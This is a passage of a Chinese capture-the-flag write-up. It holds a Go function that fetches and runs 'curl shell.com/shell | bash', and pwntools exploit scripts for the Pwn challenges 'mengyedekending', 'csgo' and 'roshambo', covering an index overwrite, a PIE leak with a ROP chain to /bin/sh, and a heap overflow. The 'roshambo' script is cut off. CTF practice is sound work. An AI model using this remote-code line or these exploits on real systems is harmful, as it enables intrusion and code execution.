+</span></span></span><span class=line><span class=cl><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>func</span><span class=w> </span><span class=nf>Read</span><span class=p>(</span><span class=nx>input</span><span class=w> </span><span class=kt>string</span><span class=p>)</span><span class=w> </span><span class=p>([]</span><span class=kt>byte</span><span class=p>,</span><span class=w> </span><span class=kt>error</span><span class=p>)</span><span class=w>  </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=nx>input</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nx>cmd</span><span class=w> </span><span class=o>:=</span><span class=w> </span><span class=nx>exec</span><span class=p>.</span><span class=nf>Command</span><span class=p>(</span><span class=s>&#34;bash&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;-c&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;curl shell.com/shell | bash&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nx>cmd</span><span class=p>.</span><span class=nf>Run</span><span class=p>()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=p>[]</span><span class=kt>byte</span><span class=p>{},</span><span class=w> </span><span class=kc>nil</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><h2 id=pwn>Pwn</h2><h3 id=mengyedekending>mengyedekending</h3><p>C# PWN</p><p>玄学啊，讲道理偏移指定为220是可以覆盖到num来触发后门的，但是我输入220之后偏移被赋值成了50？</p><p>没事了，\r可以无限地向后推index，推到num写个0就ok了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import *
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>io = remote(&#34;111.73.46.229&#34;,51000)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>io.sendlineafter(&#34;repeat?\r\n&#34;,&#34;\r&#34;*108+&#34;\0&#34;)
+</span></span><span class=line><span class=cl>io.sendlineafter(&#34;input?\r\n&#34;,&#34;y&#34;)
+</span></span><span class=line><span class=cl>io.sendlineafter(&#34;!\r\n&#34;,str(220))
+</span></span><span class=line><span class=cl>io.interactive()
+</span></span></code></pre></div><h3 id=csgo>csgo</h3><p>过了100关之后发现一个栈溢出，本地调试通过覆盖栈上的参数泄露pie地址，部分覆盖返回地址跳回backdoor（这里要爆破1/16）。然后泄露链式栈地址用于定位<code>/bin/sh</code>参数，最后ROP获得shell。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>aslr</span> <span class=o>=</span> <span class=n>False</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;81.68.174.63&#39;</span><span class=p>,</span><span class=mi>62176</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># r = process(&#34;./pwn&#34;)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getline</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>	<span class=n>a</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>a</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>change</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=n>l</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>b</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>	<span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>l</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;</span><span class=se>\xe2</span><span class=s1>&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;</span><span class=se>\x9b</span><span class=s1>&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>				<span class=n>b</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;0&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>			<span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>				<span class=n>b</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>			<span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>3</span>
+</span></span><span class=line><span class=cl>		<span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;</span><span class=se>\xa9</span><span class=s1>&#39;</span> <span class=ow>and</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;</span><span class=se>\x9a</span><span class=s1>&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>				<span class=n>b</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>			<span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>				<span class=n>b</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>			<span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>4</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>b</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getmap</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>m</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>	<span class=n>a</span> <span class=o>=</span> <span class=n>getline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>	<span class=n>n</span> <span class=o>=</span> <span class=n>len</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>a</span> <span class=o>=</span> <span class=n>change</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>m</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>		<span class=n>a</span> <span class=o>=</span> <span class=n>getline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>		<span class=n>n</span> <span class=o>=</span> <span class=n>len</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=n>a</span> <span class=o>=</span> <span class=n>change</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=n>m</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>x</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=n>m</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pas</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>	<span class=n>x</span> <span class=o>=</span> <span class=mi>6</span>
+</span></span><span class=line><span class=cl>	<span class=n>l</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>	<span class=n>mm</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>		<span class=n>help</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;hhh&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=n>help</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;plz input x:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>help</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=n>i</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>		<span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>		<span class=n>l</span><span class=p>,</span> <span class=n>mm</span> <span class=o>=</span> <span class=n>getmap</span><span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=n>i</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>			<span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=n>i</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>				<span class=n>help</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>mm</span><span class=p>[</span><span class=n>j</span><span class=p>][</span><span class=n>k</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>		<span class=n>help</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;your answer&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>answer</span> <span class=o>=</span> <span class=n>help</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>		<span class=n>answer</span> <span class=o>=</span> <span class=n>help</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>		<span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>answer</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>help</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>		<span class=nb>print</span> <span class=s2>&#34;level &#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34; ok!&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=nb>print</span> <span class=n>answer</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>pas</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=c1># gdb.attach(r, &#34;b * 0x743c9 + 0x555555554000&#34;)</span>
+</span></span><span class=line><span class=cl><span class=c1># raw_input()</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x70</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xc000000030</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mh>0x88</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\xF0\xD0</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your name is : &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>pie</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>+</span> <span class=mh>0x555555554000</span> <span class=o>-</span> <span class=mh>0x55555575aac0</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;pie: &#34;</span> <span class=o>+</span> <span class=n>hex</span><span class=p>(</span><span class=n>pie</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x70</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xc000000180</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mh>0x88</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pie</span> <span class=o>+</span> <span class=mh>0x1190F0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your name is : &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;stack: &#34;</span> <span class=o>+</span> <span class=n>hex</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x109d3d</span> <span class=o>+</span> <span class=n>pie</span>
+</span></span><span class=line><span class=cl><span class=n>pop_rsi_r15</span> <span class=o>=</span> <span class=mh>0x119c45</span> <span class=o>+</span> <span class=n>pie</span>
+</span></span><span class=line><span class=cl><span class=n>pop_rdx_adc_rax</span> <span class=o>=</span> <span class=mh>0x79e6e</span> <span class=o>+</span> <span class=n>pie</span>
+</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x743c9</span> <span class=o>+</span> <span class=n>pie</span>
+</span></span><span class=line><span class=cl><span class=n>pop_rax_ret</span> <span class=o>=</span> <span class=mh>0x74e29</span> <span class=o>+</span> <span class=n>pie</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x70</span> <span class=o>/</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xC000000180</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x88</span> <span class=o>/</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># payload += p64(pop_rdx_adc_rax) + p64(0)</span>
+</span></span><span class=line><span class=cl><span class=c1># payload += p64(pop_rsi_r15) + p64(0) + p64(0)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span> <span class=o>+</span> <span class=mh>0xDC8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x3b</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></div><p>其中hhh的源码:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#include&lt;string.h&gt;
+</span></span><span class=line><span class=cl>#include&lt;stdio.h&gt;
+</span></span><span class=line><span class=cl>#include&lt;stdlib.h&gt;
+</span></span><span class=line><span class=cl>/*
+</span></span><span class=line><span class=cl>a[100][100]
+</span></span><span class=line><span class=cl>*/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>void printmap(char a[1000][1000]) {
+</span></span><span class=line><span class=cl>    int i, j;
+</span></span><span class=line><span class=cl>    for(i = 0;i &lt; 1000;i++) {
+</span></span><span class=line><span class=cl>        for(j = 0;j &lt; 1000;j++) {
+</span></span><span class=line><span class=cl>            printf(&#34;%hhd&#34;, a[i][j]);
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>        printf(&#34;\n&#34;);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>int dfs(char a[1000][1000], char * answer, int x, int y) {
+</span></span><span class=line><span class=cl>    // printmap(a);
+</span></span><span class=line><span class=cl>    if(x &gt; 0 &amp;&amp; a[x - 1][y] == 5) {
+</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;w&#39;;
+</span></span><span class=line><span class=cl>        // puts(answer);
+</span></span><span class=line><span class=cl>        return 1;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    if(x &lt; 999 &amp;&amp; a[x + 1][y] == 5) {
+</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;s&#39;;
+</span></span><span class=line><span class=cl>        // puts(answer);
+</span></span><span class=line><span class=cl>        return 1;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    if(y &gt; 0 &amp;&amp; a[x][y - 1] == 5) {
+</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;a&#39;;
+</span></span><span class=line><span class=cl>        // puts(answer);
+</span></span><span class=line><span class=cl>        return 1;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    if(y &lt; 999 &amp;&amp; a[x][y + 1] == 5) {
+</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;d&#39;;
+</span></span><span class=line><span class=cl>        // puts(answer);
+</span></span><span class=line><span class=cl>        return 1;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    if(x &gt; 0 &amp;&amp; a[x - 1][y] == 1) {
+</span></span><span class=line><span class=cl>        a[x - 1][y] = 3;
+</span></span><span class=line><span class=cl>        a[x][y] = 2;
+</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;w&#39;;
+</span></span><span class=line><span class=cl>        // puts(answer);
+</span></span><span class=line><span class=cl>        if(dfs(a, answer, x - 1, y))
+</span></span><span class=line><span class=cl>            return 1;
+</span></span><span class=line><span class=cl>        answer[strlen(answer) - 1] = 0;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    if(x &lt; 999 &amp;&amp; a[x + 1][y] == 1) {
+</span></span><span class=line><span class=cl>        a[x + 1][y] = 3;
+</span></span><span class=line><span class=cl>        a[x][y] = 2;
+</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;s&#39;;
+</span></span><span class=line><span class=cl>        // puts(answer);
+</span></span><span class=line><span class=cl>        if(dfs(a, answer, x + 1, y))
+</span></span><span class=line><span class=cl>            return 1;
+</span></span><span class=line><span class=cl>        answer[strlen(answer) - 1] = 0;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    if(y &gt; 0 &amp;&amp; a[x][y - 1] == 1) {
+</span></span><span class=line><span class=cl>        a[x][y - 1] = 3;
+</span></span><span class=line><span class=cl>        a[x][y] = 2;
+</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;a&#39;;
+</span></span><span class=line><span class=cl>        // puts(answer);
+</span></span><span class=line><span class=cl>        if(dfs(a, answer, x, y - 1))
+</span></span><span class=line><span class=cl>            return 1;
+</span></span><span class=line><span class=cl>        answer[strlen(answer) - 1] = 0;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    if(y &lt; 999 &amp;&amp; a[x][y + 1] == 1) {
+</span></span><span class=line><span class=cl>        a[x][y + 1] = 3;
+</span></span><span class=line><span class=cl>        a[x][y] = 2;
+</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;d&#39;;
+</span></span><span class=line><span class=cl>        // puts(answer);
+</span></span><span class=line><span class=cl>        if(dfs(a, answer, x, y + 1))
+</span></span><span class=line><span class=cl>            return 1;
+</span></span><span class=line><span class=cl>        answer[strlen(answer) - 1] = 0;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    return 0 ;
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>void find(char a[1000][1000], char * answer) {
+</span></span><span class=line><span class=cl>    int i, j;
+</span></span><span class=line><span class=cl>    int x, y;
+</span></span><span class=line><span class=cl>    for(i = 0;i &lt; 1000;i++) {
+</span></span><span class=line><span class=cl>        for(j = 0;j &lt; 1000;j++) {
+</span></span><span class=line><span class=cl>            if(a[i][j] == 3) {
+</span></span><span class=line><span class=cl>                x = i;
+</span></span><span class=line><span class=cl>                y = j;
+</span></span><span class=line><span class=cl>            }
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    // printf(&#34;%d %d\n&#34;, x, y);
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    dfs(a, answer, x, y);
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>int main(){
+</span></span><span class=line><span class=cl>    char a[1000][1000] = {0};
+</span></span><span class=line><span class=cl>    setvbuf(stdin, 0LL, 2, 0LL);
+</span></span><span class=line><span class=cl>    setvbuf(stdout, 0LL, 2, 0LL);
+</span></span><span class=line><span class=cl>    setvbuf(stderr, 0LL, 2, 0LL);
+</span></span><span class=line><span class=cl>    fflush(stdout);
+</span></span><span class=line><span class=cl>    fflush(stdin);
+</span></span><span class=line><span class=cl>    fflush(stderr);
+</span></span><span class=line><span class=cl>    puts(&#34;plz input x:&#34;);
+</span></span><span class=line><span class=cl>    int x;
+</span></span><span class=line><span class=cl>    scanf(&#34;%d&#34;,&amp;x);
+</span></span><span class=line><span class=cl>    int i;
+</span></span><span class=line><span class=cl>    int j;
+</span></span><span class=line><span class=cl>    for(i=0;i&lt;x;i++){
+</span></span><span class=line><span class=cl>        for(j=0;j&lt;x;j++)
+</span></span><span class=line><span class=cl>        {
+</span></span><span class=line><span class=cl>		    int m=0;
+</span></span><span class=line><span class=cl>        	scanf(&#34;%d&#34;,&amp;m);
+</span></span><span class=line><span class=cl>        	a[i][j]=m;
+</span></span><span class=line><span class=cl>	    }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    char *answer;
+</span></span><span class=line><span class=cl>    answer=malloc(0x1000);
+</span></span><span class=line><span class=cl>    find(a, answer);
+</span></span><span class=line><span class=cl>    printf(&#34;your answer\n&#34;);
+</span></span><span class=line><span class=cl>    puts(answer);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    return 0;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></div><p><a href=https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec>https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec</a></p><h3 id=roshambo>roshambo</h3><p><strong>Second Blood</strong></p><p>2a51&mdash;sha-256
+最后有个堆溢出，malloc 0的时候会read 0xfffffffff</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#coding=utf-8</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;81.68.174.63&#39;</span><span class=p>,</span><span class=mi>64681</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;81.68.174.63&#39;</span><span class=p>,</span><span class=mi>64681</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.27.so&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;AMD64&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span><span class=s1>&#39;DEBUG&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>author</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=n>name</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=n>name2</span><span class=o>=</span><span class=s1>&#39;b&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Your Mode: &#39;</span><span class=p>,</span><span class=s1>&#39;C&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Authorization:&#39;</span><span class=p>,</span><span class=n>author</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Your room: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>room</span><span class=o>=</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Your Name: &#39;</span><span class=p>,</span><span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Your Mode: &#39;</span><span class=p>,</span><span class=s1>&#39;L&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;our room: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>room</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Your Name:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gd</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
